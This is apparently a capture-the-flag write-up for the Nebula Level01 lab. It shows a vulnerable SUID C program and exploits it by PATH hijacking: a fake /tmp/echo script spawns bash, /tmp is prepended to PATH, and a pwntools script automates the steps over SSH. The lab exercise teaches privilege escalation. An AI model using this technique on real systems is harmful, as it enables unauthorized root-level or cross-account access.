# Level01

#### Description

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the **level01** account with the password **level01**. Files for this level can be found in /home/flag01.

#### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

***

#### Solution

First of all let's switch on to the directory where those files were present.

```bash
level01@nebula:~$ cd /home/flag01
level01@nebula:/home/flag01$ ls -la
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
```

`flag01` is the binary on which SUID bit has set.

Checking source code revealed a vulnerability - PATH hijacking.

```bash
system("/usr/bin/env echo and now what?");
```

Binary is not using absolute path for `echo` command and it can be exploitable by making our own `echo` binary somewhere else and add that directory path to PATH environment.

Make a new echo binary in `/tmp` folder and give it executable permission.

```bash
level01@nebula:/home/flag01$ cd /tmp
level01@nebula:/tmp$ echo -e '#!/bin/bash\nbash -i' > echo
level01@nebula:/tmp$ ls
echo  VMwareDnD  vmware-root
level01@nebula:/tmp$ chmod +x echo
```

Add `/tmp` directory path to PATH environment variable.

```bash
level01@nebula:/tmp$ export PATH=/tmp:$PATH
level01@nebula:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

This will call that echo binary we created in `/tmp` folder instead of the original one.

```bash
level01@nebula:/tmp$ /home/flag01/flag01
flag01@nebula:/tmp$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
flag01@nebula:/tmp$ getflag
You have successfully executed getflag on a target account
```

Successfully got flag01 user's account shell and completed this level.

***

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level01', password='level01')

# start a remote shell
terminal = session.shell()

# Creating a fake echo binary on /tmp directory
binary_creation_cmd = "echo -e '#!/bin/bash\nbash -i' > /tmp/echo"
terminal.sendline(binary_creation_cmd)
terminal.sendline("chmod +x /tmp/echo")
print("Successfully created fake /tmp/echo binary")

# Exporting /tmp directory to PATH environment variable
terminal.sendline("export PATH=/tmp:$PATH")

# Executing target binary
terminal.sendline('/home/flag01/flag01')
terminal.sendline("getflag")

terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

***
